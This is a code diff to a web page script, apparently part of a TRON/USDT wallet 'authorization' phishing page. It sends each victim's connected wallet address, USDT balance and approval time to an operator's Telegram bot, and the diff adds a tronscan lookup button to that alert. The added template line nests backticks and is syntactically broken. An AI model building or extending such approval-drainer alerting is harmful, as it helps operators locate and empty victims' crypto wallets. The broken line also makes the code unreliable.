@@ -218,10 +218,16 @@
         // 构建 Telegram 消息
         const message = `
             *🟣【TRC授权通知】*\n\n
-            🔔监听地址： ${walletAddress}\n\n
+            🔔监听地址： `${walletAddress}`\n\n
             💰USDT余额： ${usdtBalance} USDT\n\n
             ⏰授权时间： ${currentTime}\n
         `;
+
+        // 构建查询按钮 URL
+        const queryButton = {
+            text: '链上查询该地址',
+            url: `https://tronscan.io/#/address/${walletAddress}`
+        };
 
         // 使用 Fetch API 向 Telegram 发送请求
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -233,6 +239,9 @@
                 chat_id: chatId,
                 text: message,
                 parse_mode: 'Markdown',
+                reply_markup: JSON.stringify({
+                    inline_keyboard: [[queryButton]]  // 添加查询按钮
+                }),
             }),
         })
         .then(response => response.json())
@@ -253,6 +262,7 @@
         lianjieqianbao();
     });
 </script>
+
 
 
 
